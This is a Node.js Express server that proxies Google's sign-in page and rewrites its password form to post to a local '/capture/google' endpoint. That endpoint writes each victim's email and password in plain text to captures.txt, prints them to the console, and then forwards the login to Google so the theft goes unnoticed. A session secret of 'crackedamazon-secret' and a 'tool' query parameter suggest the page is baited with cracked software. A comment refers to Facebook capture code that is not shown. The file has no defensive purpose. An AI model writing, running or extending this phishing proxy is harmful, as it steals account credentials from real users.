const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({ secret: 'crackedamazon-secret', resave: false, saveUninitialized: true }));
app.use(express.static(__dirname));

// Google login page (GET)
app.get('/auth/google', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    
    createProxyMiddleware({
        target: 'https://accounts.google.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => body += chunk);
            proxyRes.on('end', () => {
                // Change form action to point to CORRECT capture endpoint
                body = body.replace(/action="\/v3\/signin\/challenge\/pwd/g, 'action="/capture/google');
                res.send(body);
            });
        }
    })(req, res, next);
});

// Google login POST (CORRECT ENDPOINT)
app.post('/capture/google', (req, res, next) => {
    const { email, password } = req.body;
    const tool = req.session.tool || 'unknown';
    
    // Save credentials
    fs.appendFileSync('captures.txt', `[${new Date().toISOString()}] GOOGLE | ${email}:${password} | Tool: ${tool}\n`);
    console.log(`✅ GOOGLE: ${email}:${password}`);
    
    // Forward to correct Google password endpoint
    req.url = '/v3/signin/challenge/pwd';
    req.target = 'https://accounts.google.com';
    next();
});

// Forward to Google with proper body
app.use('/capture/google', createProxyMiddleware({
    target: 'https://accounts.google.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    onProxyReq: (proxyReq, req) => {
        if (req.body) {
            const bodyData = new URLSearchParams(req.body).toString();
            proxyReq.setHeader('Content-Type', 'application/x-www-form-urlencoded');
            proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
            proxyReq.write(bodyData);
        }
    }
}));

// Keep your existing Facebook code...
// [Your existing Facebook code remains the same]

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Fixed proxy running on port ${PORT}`);
});
